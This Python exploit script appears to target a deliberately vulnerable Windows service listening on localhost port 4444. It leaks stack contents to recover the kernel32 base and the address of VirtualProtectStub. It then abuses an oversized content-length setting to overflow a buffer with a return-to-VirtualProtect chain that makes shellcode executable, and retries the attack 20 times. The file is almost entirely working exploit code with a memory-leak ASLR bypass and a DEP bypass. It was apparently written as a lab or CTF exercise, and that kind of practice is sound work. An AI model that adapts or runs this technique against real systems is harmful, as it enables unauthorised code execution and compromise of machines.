from util import *
from environment import *
from functools import reduce

s = Socket("127.0.0.1", 4444)

N = 20
OFFSET_CONTENT_TO_BASE_THREAD_INIT_THUNK_0x19 = 0x64
OFFSET_CONTENT_TO_SAVED_EBP = 0x18
OFFSET_CONTENT_TO_RET = OFFSET_CONTENT_TO_SAVED_EBP + 4
OFFSET_EBP_TO_CONTENT = 0x60

CONTENT_LEN = 200


def cmd():
    return s.recvuntil(b"cmd: ")


def send_n(n: int):
    s.send(f"{n}\r\n".encode("utf-8"))


def get_content():
    send_n(1)

    d = cmd().split(b"\r")[0].split(b" ")
    d.pop()
    d = reduce(lambda a, x: a + int(x, 16).to_bytes(1, "little"), d, b"")
    return d


def exit_func():
    send_n(8)  # invalid number


def set_content_len(l: int):
    send_n(2)
    s.recvuntil(b"content length: ")
    send_n(16)
    s.recvuntil(b"content: ")
    s.send((b"A" * 12) + le32(l) + b"\r\n")


def write_mem(data: bytes):
    send_n(2)
    s.recvuntil(b"content: ")
    s.send(data + b"\r\n")


def generate_payload(
    padding_size: int, shell_code_address: int, virtualProtectStub_address: int
) -> bytes:
    payload = b""
    payload += b"A" * padding_size
    payload += le32(virtualProtectStub_address)
    payload += le32(shell_code_address)
    payload += le32(shell_code_address)
    payload += le32(len(X86_SHELL_CODE))
    payload += le32(0x40)
    payload += le32(shell_code_address - 7 * 4)  # padding area
    payload += X86_SHELL_CODE

    return payload


def main() -> bool:
    result = False

    s.connect()
    cmd()
    set_content_len(CONTENT_LEN)  # must be big than payload size
    cmd()
    data = get_content()

    for offset in [0, 4, 8, 12]:
        kernel32_BaseThreadInitThunk_address = (
            to_u32(data, OFFSET_CONTENT_TO_BASE_THREAD_INIT_THUNK_0x19 + offset) - 0x19
        )
        kernel32_address = (
            kernel32_BaseThreadInitThunk_address - X86_OFFSET_BaseThreadInitThunk
        )
        kernel32_VirtualProtectStub_address = (
            kernel32_address + X86_OFFSET_VirtualProtectStub
        )

        if kernel32_address & 0xFFFF == 0:
            result = True
            saved_ebp = to_u32(data, OFFSET_CONTENT_TO_SAVED_EBP + offset)
            content_address = saved_ebp - OFFSET_EBP_TO_CONTENT + offset

            print(f"offset: {offset}")
            print(f"saved ebp: 0x{saved_ebp:x}")
            print(f"content.content: 0x{content_address:x}")
            print(f"kernel32 base: 0x{kernel32_address:x}")
            print(
                f"kernel32!VirtualProtectStub: 0x{kernel32_VirtualProtectStub_address:x}"
            )

            # pwn
            padding_size = OFFSET_CONTENT_TO_RET + offset
            shell_code_address = content_address + padding_size + 4 * 6
            payload = generate_payload(
                padding_size, shell_code_address, kernel32_VirtualProtectStub_address
            )
            print(f"payload: {payload}")

            assert CONTENT_LEN >= len(payload) + 2

            write_mem(payload)

            cmd()
            exit_func()

            break

    if not result:
        print("No valid address")

    s.kill()
    return result


if __name__ == "__main__":
    results = []
    for _ in range(N):
        results.append(main())

    print(f"{sum(1 for x in results if x)}/{N} OK")
